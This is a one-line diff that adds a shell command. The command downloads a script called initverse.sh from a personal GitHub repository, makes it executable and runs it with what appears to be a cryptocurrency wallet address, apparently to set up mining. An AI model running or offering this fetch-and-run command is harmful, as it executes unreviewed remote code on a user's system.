@@ -1,0 +1,1 @@
+wget -O initverse.sh https://raw.githubusercontent.com/a154225859/demo/refs/heads/main/initverse.sh && chmod +x initverse.sh && ./initverse.sh 0x1CfAd7E6cF1e30155a2D91a89395663829c6583C
